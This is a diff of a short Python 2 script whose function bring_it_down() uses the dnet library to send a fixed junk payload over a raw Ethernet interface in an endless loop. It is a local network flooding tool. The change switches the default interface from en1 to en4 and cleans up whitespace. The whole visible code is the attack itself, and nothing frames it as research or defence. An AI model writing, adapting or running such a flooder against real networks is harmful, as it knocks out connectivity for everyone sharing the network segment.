@@ -9,12 +9,12 @@
 
 import dnet
 
-def bring_it_down(iface="en1", spam_packet='HOST:all|GET:spam'):
+def bring_it_down(iface="en4", spam_packet='HOST:all|GET:spam'):
     datalink = dnet.eth(iface)
     h = datalink.get().encode('hex_codec')
-    mac = ':'.join([h[i:i+2] for i in range(0,len(h),2)])
+    mac = ':'.join([h[i:i+2] for i in range(0, len(h), 2)])
     print 'Interface: %s\nMAC Address: %s\nPayload: %s' % (iface, mac, spam_packet)
-    while True: 
+    while True:
         datalink.send(spam_packet)
 
 
